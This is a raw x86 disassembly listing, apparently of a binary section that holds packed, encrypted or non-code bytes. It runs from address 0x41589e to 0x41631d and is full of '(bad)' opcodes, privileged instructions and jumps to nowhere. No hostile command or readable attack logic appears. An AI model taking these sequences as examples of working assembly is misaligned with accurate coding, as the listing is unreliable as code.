  41589e:	cmp    DWORD PTR [esi],0xfffffff6
  4158a1:	popa   
  4158a2:	push   ebp
  4158a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158a4:	outs   dx,DWORD PTR ds:[esi]
  4158a5:	test   eax,0xebaa6101
  4158aa:	jecxz  0x415852
  4158ac:	fistp  WORD PTR [esi+0x1a8b9c42]
  4158b2:	sub    al,0xd3
  4158b4:	ret    0xcd23
  4158b7:	jbe    0x41587f
  4158b9:	icebp  
  4158ba:	push   edx
  4158bb:	fild   WORD PTR [ebx-0x4c]
  4158be:	push   eax
  4158bf:	mov    eax,ds:0x4ebf9c89
  4158c4:	pop    ecx
  4158c5:	(bad)
  4158c8:	dec    ecx
  4158c9:	cwde   
  4158ca:	mov    al,0x97
  4158cc:	test   al,0xa1
  4158ce:	imul   esi,DWORD PTR [ecx+0x5],0x1b
  4158d2:	sbb    DWORD PTR [edx+edi*1],esi
  4158d5:	mov    esp,0xc3546465
  4158da:	adc    eax,0x9cc23643
  4158df:	push   esi
  4158e0:	mov    bl,0x69
  4158e2:	pusha  
  4158e3:	fimul  DWORD PTR [ebp+0x6c8a2816]
  4158e9:	loop   0x415913
  4158eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158ec:	mov    eax,fs:0xea721aa1
  4158f2:	push   ds
  4158f3:	nop
  4158f4:	loop   0x41590f
  4158f6:	fdivr  DWORD PTR [edx]
  4158f8:	shr    DWORD PTR [ebp+0x66],1
  4158fb:	dec    ebx
  4158fc:	jmp    0x415925
  4158fe:	inc    edx
  4158ff:	mov    DWORD PTR [esi+0x4a],edx
  415902:	sub    eax,0xda364432
  415907:	popf   
  415908:	ja     0x4158e9
  41590a:	mov    ds:0x69d1e06f,eax
  41590f:	sub    bl,dl
  415911:	push   es
  415912:	test   al,0xf2
  415914:	push   ss
  415915:	mov    ds:0x8dc5e17f,eax
  41591a:	xor    eax,0x79837194
  41591f:	jmp    0x41594d
  415921:	loop   0x41597f
  415923:	cmp    eax,0xf3fbf6bd
  415928:	(bad)  
  415929:	enter  0x889e,0xc5
  41592d:	sbb    eax,0xc454f4fd
  415932:	adc    al,0x8b
  415934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415935:	into   
  415936:	xchg   DWORD PTR [edx+0x569a8bbf],ebp
  41593c:	cmp    DWORD PTR [ecx],0xf1048a67
  415942:	out    0x6f,eax
  415944:	std    
  415945:	loopne 0x415922
  415947:	ss out dx,eax
  415949:	mov    edx,0xe015c3b4
  41594e:	cld    
  41594f:	sbb    DWORD PTR [ecx+0x79],esp
  415952:	retf   
  415953:	pop    DWORD PTR [ecx]
  415955:	push   ss
  415956:	js     0x4159be
  415958:	pop    edx
  415959:	mov    ?,esi
  41595b:	js     0x4158e7
  41595d:	nop
  41595e:	jne    0x415990
  415960:	and    cl,BYTE PTR [edi+0x55]
  415963:	or     ebx,DWORD PTR [ebp-0x37]
  415966:	mov    ebp,0x8e814644
  41596b:	mov    WORD PTR [ebp-0x7924cdbf],ss
  415971:	jecxz  0x41590a
  415973:	cs loop 0x415974
  415976:	mov    edx,0x3ce055dc
  41597b:	jnp    0x4159ed
  41597d:	lock adc ah,dl
  415980:	ret    
  415981:	inc    ebx
  415982:	lods   eax,DWORD PTR fs:[esi]
  415984:	or     dl,BYTE PTR [edi-0x4f7cd508]
  41598a:	jae    0x415982
  41598c:	repnz mov edx,0x935b
	...
  4159f2:	add    BYTE PTR [eax],al
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	cwde   
  415a01:	das    
  415a02:	xor    al,0x49
  415a04:	and    al,0xe4
  415a06:	add    BYTE PTR [eax],al
  415a08:	add    al,0x1
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	pop    esi
  415a0d:	test   al,0xec
  415a0f:	retf   
  415a10:	stc    
  415a11:	outs   dx,DWORD PTR ds:[esi]
  415a12:	push   0xffffffe8
  415a14:	clc    
  415a15:	xor    BYTE PTR [edi+0xd],dl
  415a18:	das    
  415a19:	mov    dh,0xbd
  415a1b:	adc    esi,DWORD PTR [ecx-0x10]
  415a1e:	or     ah,0x3b
  415a21:	fiadd  DWORD PTR [edx]
  415a23:	lds    ecx,FWORD PTR [ebx]
  415a25:	dec    esp
  415a26:	mov    eax,0xbed1972f
  415a2b:	dec    ebp
  415a2c:	dec    esp
  415a2d:	rcl    BYTE PTR [ebx-0x4d1f874e],1
  415a33:	in     eax,dx
  415a34:	arpl   WORD PTR [eax+0x66],sp
  415a37:	je     0x415a1e
  415a39:	push   esi
  415a3a:	mov    al,ds:0x5b158393
  415a3f:	shr    DWORD PTR [edi],cl
  415a41:	rcl    DWORD PTR [ebx+0x1b],cl
  415a44:	push   ecx
  415a45:	iret   
  415a46:	adc    cl,BYTE PTR [esi+esi*4+0x5a]
  415a4a:	retf   
  415a4b:	cwde   
  415a4c:	aam    0x9f
  415a4e:	lea    ebp,[ebx+eax*4-0x6a]
  415a52:	jae    0x415a27
  415a54:	cmp    DWORD PTR [esi-0x51e99db4],ebp
  415a5a:	or     eax,0xb1e85de9
  415a5f:	(bad)  
  415a60:	aam    0x12
  415a62:	and    ch,al
  415a64:	aam    0xfd
  415a66:	cmp    eax,DWORD PTR [eax-0x1c]
  415a69:	sbb    BYTE PTR [edx],dl
  415a6b:	(bad)  
  415a6c:	mov    eax,0x8c7d4587
  415a71:	in     ax,0x1b
  415a74:	int3   
  415a75:	mov    ds:0xd959ecae,eax
  415a7a:	mov    edx,0x77d88025
  415a7f:	dec    ebx
  415a80:	(bad)  
  415a81:	outs   dx,BYTE PTR ds:[esi]
  415a82:	rcr    DWORD PTR [esi],0xb9
  415a85:	nop
  415a86:	mov    ebx,0x7fe51f52
  415a8b:	cmp    DWORD PTR ds:[edx],eax
  415a8e:	cli    
  415a8f:	mov    bl,0x98
  415a91:	enter  0x5d8f,0xc7
  415a95:	js     0x415ad8
  415a97:	out    dx,al
  415a98:	pop    eax
  415a99:	sbb    edi,DWORD PTR [esi]
  415a9b:	nop
  415a9c:	jmp    0x415a91
  415a9e:	rdtsc  
  415aa0:	jmp    0x24eb:0xe300a27c
  415aa7:	mov    edi,0xc220e7b3
  415aac:	loope  0x415ac9
  415aae:	in     eax,0xdd
  415ab0:	push   edx
  415ab1:	sbb    esi,ebx
  415ab3:	mov    bl,0x80
  415ab5:	xchg   ebx,eax
  415ab6:	rol    DWORD PTR [eax+ecx*8],cl
  415ab9:	gs dec ebx
  415abb:	xchg   BYTE PTR [edi-0x5],bh
  415abe:	test   dh,ch
  415ac0:	in     al,dx
  415ac1:	xchg   esi,eax
  415ac2:	mov    ds:0xec0f98a6,al
  415ac7:	xchg   ebx,eax
  415ac8:	mov    ah,0x15
  415aca:	xchg   esi,eax
  415acb:	test   BYTE PTR [esi-0x23d68ee9],cl
  415ad1:	pop    ebp
  415ad2:	test   dh,ch
  415ad4:	fistp  WORD PTR [eax-0xecfc9db]
  415ada:	cmp    eax,0x75efa92e
  415adf:	mov    esp,DWORD PTR [edi+0x19]
  415ae2:	xchg   ebp,eax
  415ae3:	jnp    0x415afa
  415ae5:	add    BYTE PTR [edx-0x5d],ah
  415ae8:	mov    bh,0xf1
  415aea:	lahf   
  415aeb:	push   ecx
  415aec:	ins    BYTE PTR es:[edi],dx
  415aed:	stos   BYTE PTR es:[edi],al
  415aee:	jne    0x415b37
  415af0:	int    0x22
  415af2:	jmp    edi
  415af4:	mov    ds:0xb9a43407,eax
  415af9:	fstp   st(1)
  415afb:	rol    DWORD PTR [ebx-0x1e851a60],0xb7
  415b02:	bnd jp 0x415af6
  415b05:	dec    edi
  415b06:	mov    bl,0x5d
  415b08:	pop    ebp
  415b09:	xchg   edi,eax
  415b0a:	add    eax,0xaf91f030
  415b0f:	outs   dx,DWORD PTR ds:[esi]
	...
  415b74:	fistp  QWORD PTR [esi-0x449a6dfb]
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fadd   QWORD PTR [edi+0x4f]
  415b82:	rcr    DWORD PTR [eax+ebp*1+0x40000e5],cl
  415b89:	add    DWORD PTR [eax],eax
  415b8b:	add    BYTE PTR [ecx-0x1b],bh
  415b8e:	add    BYTE PTR [ecx+0x53b1fd61],dh
  415b94:	sub    DWORD PTR [ecx-0x3d],eax
  415b97:	(bad)  
  415b98:	fbld   TBYTE PTR [esi+0x1709e016]
  415b9e:	and    BYTE PTR [eax-0x54bc441f],cl
  415ba4:	jge    0x415ba4
  415ba6:	pop    edx
  415ba7:	pop    ebx
  415ba8:	(bad)  
  415ba9:	mov    ebp,0x238da740
  415bae:	and    BYTE PTR [edx-0x3f1b88a8],dl
  415bb4:	and    al,0xf0
  415bb6:	inc    esp
  415bb7:	ins    BYTE PTR es:[edi],dx
  415bb8:	shl    al,1
  415bba:	retf   
  415bbb:	push   edi
  415bbc:	fiadd  DWORD PTR [eax]
  415bbe:	inc    esi
  415bbf:	pop    edi
  415bc0:	mov    ds:0x18810f2a,al
  415bc5:	(bad)  
  415bc6:	push   0xffffffae
  415bc8:	sti    
  415bc9:	mov    al,0x5d
  415bcb:	jo     0x415c2a
  415bcd:	dec    esp
  415bce:	sahf   
  415bcf:	mov    al,0x2a
  415bd1:	cli    
  415bd2:	(bad)  [ecx]
  415bd4:	or     al,BYTE PTR [esi]
  415bd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bd7:	dec    ecx
  415bd8:	mov    ebp,0x56c941ed
  415bdd:	mov    edx,0xd445ae22
  415be2:	add    ah,BYTE PTR [ebp+0x31b9d816]
  415be8:	hlt    
  415be9:	loopne 0x415c58
  415beb:	cmp    DWORD PTR [ebx+0x1c5dd29a],edi
  415bf1:	stos   DWORD PTR es:[edi],eax
  415bf2:	hlt    
  415bf3:	pop    eax
  415bf4:	aas    
  415bf5:	mov    esp,0x4399a8f6
  415bfa:	out    0x95,al
  415bfc:	ins    BYTE PTR es:[edi],dx
  415bfd:	push   ebp
  415bfe:	sbb    al,0x19
  415c00:	push   ebp
  415c01:	and    BYTE PTR [esi-0x6a],0x12
  415c05:	pop    esp
  415c06:	jl     0x415c15
  415c08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c09:	outs   dx,DWORD PTR ds:[esi]
  415c0a:	jmp    0x415b9b
  415c0c:	aas    
  415c0d:	aad    0xa7
  415c0f:	xchg   esi,eax
  415c10:	mov    edx,0x9ed04cdc
  415c15:	outs   dx,BYTE PTR ds:[esi]
  415c16:	adc    al,0x2d
  415c18:	jno    0x415c43
  415c1a:	pop    ds
  415c1b:	retf   0xd3c2
  415c1e:	inc    ecx
  415c1f:	pop    es
  415c20:	pop    esp
  415c21:	pop    edx
  415c22:	ds jle 0x415c84
  415c25:	xor    al,0x78
  415c27:	cmp    edi,edx
  415c29:	inc    ebp
  415c2a:	sub    dh,BYTE PTR [eax-0x7a547374]
  415c30:	jnp    0x415bd7
  415c32:	or     DWORD PTR [edi],edi
  415c34:	and    ah,BYTE PTR [ecx]
  415c36:	mov    WORD PTR [ebx-0x5a9a4002],ss
  415c3c:	mov    esp,0x5f316810
  415c41:	aaa    
  415c42:	pop    ecx
  415c43:	outs   dx,BYTE PTR ds:[esi]
  415c44:	lock test DWORD PTR [ebx+0x3],ecx
  415c48:	mov    ds:0x73c4be83,eax
  415c4d:	sub    eax,0xf9c61e53
  415c52:	inc    esi
  415c53:	cs xchg ebx,eax
  415c55:	push   es
  415c56:	jmp    0x36ebf00e
  415c5b:	mov    bh,0x4e
  415c5d:	test   al,0x5b
  415c5f:	daa    
  415c60:	clc    
  415c61:	in     eax,0x7b
  415c63:	pop    DWORD PTR [edx-0x3d1c6945]
  415c69:	call   0xed796d6c
  415c6e:	mov    eax,0x2ad22a0b
  415c73:	push   esi
  415c74:	mov    bh,BYTE PTR [eax-0x67]
  415c77:	xor    eax,0xc4febc09
  415c7c:	inc    esi
  415c7d:	imul   ecx,DWORD PTR [ebx+0x39345d22],0xffffff9d
  415c84:	pop    es
  415c85:	cs add dl,0xdc
  415c89:	enter  0x17ca,0xae
  415c8d:	neg    DWORD PTR [esi]
  415c8f:	mov    ebp,0x0
	...
  415cf4:	cmp    dl,BYTE PTR [eax]
  415cf6:	mov    edi,0xbbbfbf3c
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0xa6cb9f1f
  415d03:	popa   
  415d04:	sub    al,0xe6
  415d06:	add    BYTE PTR [eax],al
  415d08:	add    al,0x1
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	test   BYTE PTR [ecx+0x56492806],ch
  415d12:	push   0xa
  415d14:	popa   
  415d15:	sub    al,0xcb
  415d17:	or     ah,al
  415d19:	aam    0xad
  415d1b:	cmp    eax,0xc5fdc57a
  415d20:	std    
  415d21:	mov    al,ds:0x3dcd0db7
  415d26:	push   cs
  415d27:	jmp    0x6860dbd2
  415d2c:	dec    edi
  415d2d:	mov    BYTE PTR [edx],dl
  415d2f:	mov    BYTE PTR [edx-0x32],0xf3
  415d33:	(bad)  
  415d35:	stos   DWORD PTR es:[edi],eax
  415d36:	imul   eax,DWORD PTR [edi-0x7db60f28],0x27
  415d3d:	jg     0x415dba
  415d3f:	in     al,0x9
  415d41:	xor    al,0x8d
  415d43:	mov    edx,0x8f72f1d4
  415d48:	jb     0x415d4b
  415d4a:	test   al,0x61
  415d4c:	jnp    0x415dbf
  415d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d4f:	jge    0x415cf1
  415d51:	ror    bl,1
  415d53:	cmp    DWORD PTR [esi+ebp*2-0x54],edx
  415d57:	loope  0x415d44
  415d59:	aad    0x4c
  415d5b:	jmp    0x415d4e
  415d5d:	data16 add BYTE PTR [edx-0x41],ch
  415d61:	adc    al,0x57
  415d63:	aam    0x53
  415d65:	sbb    al,0xaf
  415d67:	adc    al,0x10
  415d69:	mov    edx,DWORD PTR [ecx+ebx*4]
  415d6c:	into   
  415d6d:	retf   0x18e7
  415d70:	or     eax,0x50477eaf
  415d75:	icebp  
  415d76:	inc    ebp
  415d77:	inc    eax
  415d78:	mov    bl,0x31
  415d7a:	std    
  415d7b:	test   eax,0x2a1d4cf2
  415d80:	test   DWORD PTR [ebp-0x56],0xbf4502d1
  415d87:	push   0xbe29d514
  415d8c:	mov    bl,BYTE PTR [ebx+0x5a036c28]
  415d92:	dec    ebx
  415d93:	push   ecx
  415d94:	stos   BYTE PTR es:[edi],al
  415d95:	imul   DWORD PTR [esi]
  415d97:	mov    WORD PTR [ecx+0x43],?
  415d9a:	(bad)  [ebx+0x47]
  415d9d:	jae    0x415e17
  415d9f:	or     al,0x43
  415da1:	cmp    dh,BYTE PTR [ebx-0x39548a1d]
  415da7:	mov    ch,al
  415da9:	ins    DWORD PTR es:[edi],dx
  415daa:	jae    0x415dc2
  415dac:	xor    BYTE PTR ds:0xebaf12f8,dl
  415db2:	mov    bl,0x94
  415db4:	cld    
  415db5:	push   ecx
  415db6:	push   edx
  415db7:	push   ebp
  415db8:	xor    ebx,DWORD PTR ds:0x254f2e00
  415dbe:	sub    eax,0x26dc3fe8
  415dc3:	or     ah,BYTE PTR [edi+0x6d87ca34]
  415dc9:	fnstenv [ebp+0x3d9b2125]
  415dcf:	dec    ecx
  415dd0:	dec    ebx
  415dd1:	ss scas al,BYTE PTR es:[edi]
  415dd3:	fucompp 
  415dd5:	push   cs
  415dd6:	sbb    ch,dh
  415dd8:	jmp    0x42d9:0x58bf7f72
  415ddf:	(bad)  
  415de0:	mov    edx,0x7a2e648e
  415de5:	icebp  
  415de6:	arpl   WORD PTR [edx+0x79],dx
  415de9:	int    0xa6
  415deb:	pop    edx
  415dec:	push   cs
  415ded:	mov    eax,ds:0xdc0585fc
  415df2:	mov    edx,0x6175cfcd
  415df7:	out    dx,al
  415df8:	inc    edx
  415df9:	add    BYTE PTR [ebx],dl
  415dfb:	fidiv  WORD PTR [ebp-0x15]
  415dfe:	jl     0x415dc6
  415e00:	mov    dx,0xb768
  415e04:	xchg   esp,eax
  415e05:	test   eax,0x64fcb37b
  415e0a:	xor    BYTE PTR [esi],dh
  415e0c:	mov    BYTE PTR [ebx+0x1f88],ch
	...
  415e72:	add    BYTE PTR [eax],al
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x5]
  415e81:	popf   
  415e82:	ins    DWORD PTR es:[edi],dx
  415e83:	je     0x415eb5
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR [ecx+eax*1],al
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	loopne 0x415e76
  415e8e:	sbb    al,BYTE PTR [ecx-0x6336e823]
  415e94:	mov    cl,0x29
  415e96:	mov    esp,0x27ddc0eb
  415e9b:	int    0x6f
  415e9d:	je     0x415e6b
  415e9f:	enter  0x574a,0xb
  415ea3:	sar    DWORD PTR [edx-0x649b2653],1
  415ea9:	jno    0x415ea3
  415eab:	sub    DWORD PTR [ebp+edi*8-0x56a3f55e],0xffffffbb
  415eb3:	mov    bh,BYTE PTR [ebx]
  415eb5:	mov    al,ds:0x7fdfb8ac
  415eba:	inc    ebx
  415ebb:	push   0x6e
  415ebd:	shl    bl,cl
  415ebf:	mov    esp,0xe329a446
  415ec4:	and    DWORD PTR [esi],esp
  415ec6:	pop    ecx
  415ec7:	enter  0x544,0xec
  415ecb:	les    esi,FWORD PTR [esi-0x23]
  415ece:	mov    DWORD PTR [edi-0x4763d3f1],edx
  415ed4:	pop    ds
  415ed5:	rcr    DWORD PTR ds:0xda65a096,0xb6
  415edc:	aas    
  415edd:	mov    eax,0x6b28e23a
  415ee2:	je     0x415ea8
  415ee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ee5:	ja     0x415f09
  415ee7:	mov    ebp,0x89b30f46
  415eec:	call   0xd159:0x78728976
  415ef3:	xor    edx,DWORD PTR [esi+0x73dd6ce5]
  415ef9:	ror    DWORD PTR [ecx],cl
  415efb:	or     ebp,DWORD PTR [edi+0x393e6c81]
  415f01:	mov    eax,0xdea23f1b
  415f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f07:	jns    0x415f13
  415f09:	adc    dl,bl
  415f0b:	fwait
  415f0c:	push   eax
  415f0d:	popf   
  415f0e:	nop
  415f0f:	inc    edi
  415f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f11:	dec    esp
  415f12:	add    BYTE PTR es:[ecx],0xef
  415f16:	mov    ch,0x9c
  415f18:	mov    dl,0xce
  415f1a:	xor    BYTE PTR [edx-0x6b],ah
  415f1d:	xchg   ecx,eax
  415f1e:	(bad)  
  415f1f:	cdq    
  415f20:	das    
  415f21:	sbb    eax,0x9a13bc38
  415f26:	loope  0x415ef4
  415f28:	stos   BYTE PTR es:[edi],al
  415f29:	jle    0x415eab
  415f2b:	push   eax
  415f2c:	pop    es
  415f2d:	sub    BYTE PTR [ecx],dh
  415f2f:	lds    eax,FWORD PTR [ebx+ebx*4-0x28b9280a]
  415f36:	scas   eax,DWORD PTR es:[edi]
  415f37:	cmp    BYTE PTR [edx],cl
  415f39:	imul   esp,DWORD PTR [ebp+0x5024aae4],0xffffffc2
  415f40:	or     dl,BYTE PTR ds:0xa391feed
  415f46:	(bad)  [esi]
  415f48:	outs   dx,DWORD PTR ds:[esi]
  415f49:	sbb    BYTE PTR [edx-0x3dbccf56],al
  415f4f:	cld    
  415f50:	inc    ebx
  415f51:	test   DWORD PTR [edi],esp
  415f53:	add    eax,DWORD PTR [eax+0x76]
  415f56:	int    0xbd
  415f58:	push   es
  415f59:	shr    DWORD PTR [edx+ecx*4+0x6d],0x9a
  415f5e:	mov    cl,0xac
  415f60:	test   DWORD PTR [esi],ebp
  415f62:	scas   al,BYTE PTR es:[edi]
  415f63:	retf   0x6f7e
  415f66:	sbb    dh,bh
  415f68:	mov    ss,WORD PTR [ebp-0x3a40d7c1]
  415f6e:	dec    esp
  415f6f:	ja     0x415f67
  415f71:	or     edi,DWORD PTR [esi]
  415f73:	pop    ebx
  415f74:	lea    esp,[edx+0xabf41d3]
  415f7a:	in     eax,dx
  415f7b:	inc    esi
  415f7c:	imul   esi,DWORD PTR [edx+0x5],0x7
  415f80:	xchg   edx,eax
  415f81:	push   ebp
  415f82:	cmp    eax,0x9735cbad
  415f87:	pop    ecx
  415f88:	mov    ebx,0x616186c0
  415f8d:	ja     0x415f9d
  415f8f:	clc    
	...
  415ff4:	pop    ss
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	pop    esi
  416001:	xor    DWORD PTR [ebx+0x6a],0xe834
  416008:	add    al,0x1
  41600a:	add    BYTE PTR [eax],al
  41600c:	(bad)  [esi-0x7]
  41600f:	jno    0x416001
  416011:	leave  
  416012:	sti    
  416013:	leave  
  416014:	mul    BYTE PTR [ebx]
  416016:	cmp    eax,0x9eac0653
  41601b:	jmp    0xd824:0xb9ada7d5
  416022:	outs   dx,BYTE PTR ds:[esi]
  416023:	mov    ds:0xe1588860,al
  416028:	ror    DWORD PTR [ebx+ecx*8],1
  41602b:	cmp    eax,0x39dcda2
  416030:	adc    al,0xef
  416032:	sbb    BYTE PTR [ebx-0x20],al
  416035:	gs aad 0xf9
  416038:	pop    edx
  416039:	ins    DWORD PTR es:[edi],dx
  41603a:	jmp    0xe82d:0xfecf53e1
  416041:	(bad)  
  416042:	jnp    0x41608e
  416044:	mov    edx,0x6cf91f2d
  416049:	out    dx,eax
  41604a:	mov    ch,0xba
  41604c:	sbb    eax,ebx
  41604e:	call   0xbbfb568a
  416053:	mov    WORD PTR [edx],?
  416055:	sbb    al,0x66
  416057:	in     al,dx
  416058:	lock scas al,BYTE PTR es:[edi]
  41605a:	stos   BYTE PTR es:[edi],al
  41605b:	mov    cs,WORD PTR [ecx+0x29]
  41605e:	xor    al,0xa2
  416060:	or     al,0xd0
  416062:	mov    ds:0x15f58d9c,eax
  416067:	jge    0x41605d
  416069:	cmp    bh,BYTE PTR [eax+0xa]
  41606c:	aam    0x8
  41606e:	add    dh,dh
  416070:	mov    eax,ds:0x231cc66e
  416075:	pop    es
  416076:	xchg   esi,eax
  416077:	and    eax,0x5cee8058
  41607c:	jle    0x41606c
  41607e:	add    ebx,DWORD PTR [esi-0x3e]
  416081:	xchg   bl,bl
  416083:	jbe    0x41609a
  416085:	mov    BYTE PTR [esi+0x173f9ca8],bh
  41608b:	into   
  41608c:	add    al,0x1b
  41608e:	test   al,bl
  416090:	jnp    0x4160ae
  416092:	clc    
  416093:	ret    
  416094:	out    dx,eax
  416095:	cmp    al,0x30
  416097:	fwait
  416098:	arpl   WORD PTR [ebp+0x8f01ce4],sp
  41609e:	xor    ebp,edi
  4160a0:	out    0x29,eax
  4160a2:	adc    al,0xb9
  4160a4:	jae    0x416055
  4160a6:	jne    0x416094
  4160a8:	out    dx,eax
  4160a9:	xchg   ecx,eax
  4160ab:	mov    esi,DWORD PTR [ebx-0x2a]
  4160ae:	xor    eax,0x5e09a49e
  4160b3:	mov    al,ds:0x1e9a122a
  4160b8:	xor    eax,0xcf5129b8
  4160bd:	jno    0x4160cf
  4160bf:	(bad)  
  4160c0:	xor    al,0xa2
  4160c2:	adc    dl,dl
  4160c4:	xchg   edi,eax
  4160c5:	cmp    BYTE PTR [edi-0x7f],bl
  4160c8:	inc    ebp
  4160c9:	push   0x9abe1507
  4160ce:	mov    ebx,0x54bc292a
  4160d3:	adc    al,BYTE PTR [ecx+0x50a4d745]
  4160d9:	push   cs
  4160da:	inc    esp
  4160db:	and    ch,BYTE PTR [esi+0x4e09717f]
  4160e1:	imul   edi,DWORD PTR ds:0x89396f65,0x13da5b49
  4160eb:	call   0x3df8176c
  4160f0:	jecxz  0x416080
  4160f2:	aas    
  4160f3:	cli    
  4160f4:	mov    eax,ds:0xad4f88d6
  4160f9:	bound  edi,QWORD PTR [edx+0x2b]
  4160fc:	ins    BYTE PTR es:[edi],dx
  4160fd:	(bad)  
  4160fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160ff:	outs   dx,BYTE PTR ds:[esi]
  416100:	stos   DWORD PTR es:[edi],eax
  416101:	push   0x81b27d52
  416106:	jns    0x41611f
  416108:	(bad)
  41610d:	inc    ebp
  41610e:	or     ah,BYTE PTR [ecx]
	...
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0xb13590f3
  416183:	push   edx
  416184:	cmp    cl,ch
  416186:	add    BYTE PTR [eax],al
  416188:	add    al,0x1
  41618a:	add    BYTE PTR [eax],al
  41618c:	inc    dh
  41618e:	stos   DWORD PTR es:[edi],eax
  41618f:	inc    edx
  416190:	push   edi
  416191:	inc    ebx
  416192:	mov    dh,0x11
  416194:	add    BYTE PTR [esp+eiz*4],bl
  416197:	or     ebx,DWORD PTR [ebx+0x7dcb985f]
  41619d:	addr16 repnz inc edx
  4161a0:	pusha  
  4161a1:	dec    eax
  4161a2:	inc    edi
  4161a3:	push   ss
  4161a4:	and    ebp,DWORD PTR [eax]
  4161a6:	inc    BYTE PTR [edi+0x8]
  4161a9:	(bad)  
  4161aa:	ja     0x416207
  4161ac:	and    esp,DWORD PTR [ebp+0xe]
  4161af:	ret    0x780f
  4161b2:	xor    edi,DWORD PTR [esi]
  4161b4:	push   cs
  4161b5:	imul   ebp,DWORD PTR [ecx],0xc240791a
  4161bb:	repz aaa 
  4161bd:	xor    dl,ah
  4161bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161c0:	inc    ebp
  4161c1:	int    0x97
  4161c3:	or     BYTE PTR [ebx-0x330aa0dc],dh
  4161c9:	ret    0xb30a
  4161cc:	dec    esp
  4161cd:	xchg   ebx,eax
  4161ce:	das    
  4161cf:	(bad)  
  4161d1:	xlat   BYTE PTR ds:[ebx]
  4161d2:	and    esp,ebp
  4161d4:	loopne 0x41621d
  4161d6:	or     bl,cl
  4161d8:	jecxz  0x416205
  4161da:	daa    
  4161db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161dc:	ja     0x4161c2
  4161de:	pop    eax
  4161df:	jnp    0x41617b
  4161e1:	xor    eax,0xa87c855a
  4161e6:	(bad)  
  4161e7:	bound  esp,QWORD PTR [ebx+0x36]
  4161ea:	test   al,0xf9
  4161ec:	or     bh,bl
  4161ee:	sbb    eax,0xfe2d4bdb
  4161f3:	dec    ecx
  4161f4:	sbb    DWORD PTR [ebx-0x34],ecx
  4161f7:	ror    BYTE PTR [edi+0x3c],cl
  4161fa:	add    bh,bl
  4161fc:	rcr    BYTE PTR [ebp-0x5bba6f8d],0x8b
  416203:	scas   eax,DWORD PTR es:[edi]
  416204:	icebp  
  416205:	and    ah,BYTE PTR [edx-0x19]
  416208:	mov    esi,0x8fe6a02b
  41620d:	xor    ch,al
  41620f:	hlt    
  416210:	adc    DWORD PTR [eax+0x31],eax
  416213:	cwde   
  416214:	shl    DWORD PTR [ecx],cl
  416216:	adc    esi,esi
  416218:	mov    WORD PTR [edx-0x77c4fcff],fs
  41621e:	mov    ebp,0x49b6ce83
  416223:	fld    DWORD PTR [edi+0x6f]
  416226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416227:	rcl    esp,0x72
  41622a:	push   0x74
  41622c:	mov    esp,0x23ecb832
  416231:	mov    bl,0x15
  416233:	mov    dl,0x50
  416235:	mov    al,0x17
  416237:	mov    al,ds:0x1a340fb
  41623c:	jge    0x416234
  41623e:	push   edi
  41623f:	push   edx
  416240:	push   0x80c284e2
  416245:	dec    edi
  416246:	clc    
  416247:	inc    ebp
  416248:	fisttp QWORD PTR [edx]
  41624a:	loope  0x4162a1
  41624c:	sar    BYTE PTR [ebp+0x4a131739],1
  416252:	sub    BYTE PTR [ebx-0x65],bh
  416255:	mov    edx,0x79d27d0e
  41625a:	add    ah,cl
  41625c:	loopne 0x4162cf
  41625e:	imul   ebx,DWORD PTR [edx],0x52
  416261:	cmp    al,0x80
  416263:	popf   
  416264:	xchg   ebx,eax
  416265:	pop    edi
  416266:	mov    eax,ds:0xd97573c2
  41626b:	adc    cl,BYTE PTR ds:[ebx+edi*8]
  41626f:	push   ebx
  416270:	sub    al,0xe5
  416272:	mov    dh,0x11
  416274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416275:	cwde   
  416276:	pop    ds
  416277:	dec    edi
  416278:	ret    0x9410
  41627b:	xchg   esp,eax
  41627c:	pop    es
  41627d:	fldenv [edx-0x7]
  416280:	inc    DWORD PTR [ebx+0x126785ef]
  416286:	fst    QWORD PTR [ebx-0x6a]
  416289:	arpl   WORD PTR [eax],dx
  41628b:	cmp    eax,0xd8a0783c
	...
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3ca6:0x41caa4ee
  416305:	jmp    0x0:0x1040000
  41630c:	and    ah,al
  41630e:	ss and edi,eax
  416311:	pusha  
  416312:	int    0x4e
  416314:	add    al,0x43
  416316:	mov    esp,0x4b6e50fa
  41631b:	loopne 0x4162f3
  41631d:	ret    
